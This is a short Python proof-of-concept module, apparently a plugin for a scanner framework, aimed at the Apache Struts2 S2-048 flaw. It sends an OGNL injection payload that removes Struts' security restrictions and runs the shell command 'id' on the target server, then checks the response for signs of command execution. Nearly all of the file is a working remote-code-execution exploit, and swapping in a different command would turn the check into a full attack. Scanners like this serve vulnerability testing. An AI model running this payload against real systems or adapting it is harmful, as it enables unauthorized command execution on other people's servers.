#!/usr/bin/env python
#coding:utf-8
"""
  Author:   Conan0xff
  Purpose: struts2-048
  Created: 09/03/17
"""

import time
import requests

from vikit.core.basic.modinput import TargetDemand, PayloadDemand, ParamDemand
from vikit.core.basic import target, payload, param


NAME = 'st2_048'

AUTHOR = 'Conan0xff'

DESCRIPTION = 'struts2-048 poc'

RESULT_DESC = '''return ip and result if is vulnerable'''

DEMANDS = [TargetDemand('target', target.TYPE_URL)]


def check(url):
    posturl = url+"/integration/saveGangster.action"
    data = {'name':"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}", 'age':'11', '__checkbox_bustedBefore':'true', 'description':'111'}
    headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    res=requests.post(posturl,data=data,headers=headers)
    if 'uid' in res.content and 'gid' in res.content:
        #print posturl, 's2-048 EXISTS'
        return url,'success'
    else:
        #print posturl, 's2-048 do not EXISTS'
        return url,'failed'

def exploit(target,payload,config):
    return check(target)

EXPORT_FUNC=exploit

if __name__ == '__main__':
    exploit('http://192.168.1.195:8080')
